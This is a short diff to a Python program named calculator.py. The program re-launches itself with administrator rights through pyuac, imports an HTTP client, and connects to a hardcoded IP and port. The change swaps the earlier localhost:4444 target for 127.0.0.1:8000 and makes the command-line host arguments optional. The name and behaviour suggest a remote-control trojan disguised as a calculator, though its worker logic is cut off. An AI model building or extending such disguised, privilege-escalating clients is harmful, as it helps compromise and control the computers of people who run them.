@@ -5,8 +5,8 @@ import pyuac
 
 import http_client as http_client
 
-ip = "localhost"
-port = 4444
+ip = "127.0.0.1"
+port = 8000
 stop_event = threading.Event()
 worker_thread = None
 
@@ -15,16 +15,17 @@ if __name__ == "__main__":
         print("Re-launching as admin!")
         pyuac.runAsAdmin()
     else:
-        if len(sys.argv) != 3:
-            print("Usage: python calculator.py <IP> <PORT>")
-            sys.exit(1)
+        if ip == "" and port == 0:
+            if len(sys.argv) != 3:
+                print("Usage: python calculator.py <IP> <PORT>")
+                sys.exit(1)
 
-        ip = sys.argv[1]
-        try:
-            port = int(sys.argv[2])
-        except ValueError:
-            print("PORT must be an integer.")
-            sys.exit(1)
+            ip = sys.argv[1]
+            try:
+                port = int(sys.argv[2])
+            except ValueError:
+                print("PORT must be an integer.")
+                sys.exit(1)
 
 def worker_task():
     while not stop_event.is_set():
